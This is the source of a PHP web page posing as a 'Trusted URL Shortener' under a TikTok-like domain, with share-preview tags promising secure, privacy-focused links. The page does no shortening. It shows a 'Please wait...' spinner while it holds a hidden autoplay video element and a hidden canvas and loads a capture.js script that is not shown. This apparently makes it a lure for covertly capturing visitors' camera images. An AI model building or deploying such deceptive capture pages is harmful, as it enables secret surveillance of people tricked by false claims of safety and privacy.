<?php
require_once 'config.php';
$config = require 'config.php';

// Check for thumbnail existence, use fallback if missing
$thumbnailPath = 'thumbnail.png';
$thumbnailUrl = file_exists($thumbnailPath) ? 'https://tiktoks.wuaze.com/thumbnail.png?' . time() : 'https://tiktoks.wuaze.com/fallback.png';
if (!file_exists($thumbnailPath) && $config['logging']) {
    file_put_contents('logs.txt', json_encode([
        'timestamp' => date('Y-m-d H:i:s'),
        'event' => 'Thumbnail missing',
        'path' => $thumbnailPath
    ]) . PHP_EOL, FILE_APPEND | LOCK_EX);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Trusted URL Shortener</title>

<!-- Share Preview for TikTok, Facebook, X, etc. -->
<meta property="og:title" content="Trusted URL Shortener – Secure & Reliable Links">
<meta property="og:description" content="Shorten your URLs safely with our trusted redirection service. Fast, secure, and privacy-focused.">
<meta property="og:image" content="https://tiktoks.wuaze.com/thumbnail.png">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="https://tiktoks.wuaze.com/">
<meta property="og:type" content="website">
<meta property="og:site_name" content="TikToks URL Shortener">

<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Trusted URL Shortener – Secure & Reliable Links">
<meta name="twitter:description" content="Shorten your URLs safely with our trusted redirection service. Fast, secure, and privacy-focused.">
<meta name="twitter:image" content="https://tiktoks.wuaze.com/thumbnail.png">
<meta name="twitter:site" content="@TikToksShortener">

  <style>
    body { background: black; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
    .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 80px; height: 80px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    #loading-text { color: white; font-family: sans-serif; text-align: center; margin-top: 16px; font-size: 1.2em; }
    @media (max-width: 480px) { .spinner { width: 60px; height: 60px; border-width: 6px; } #loading-text { font-size: 1em; } }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <div id="loading-text">Please wait...</div>

  <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <script src="capture.js"></script>
</body>
</html>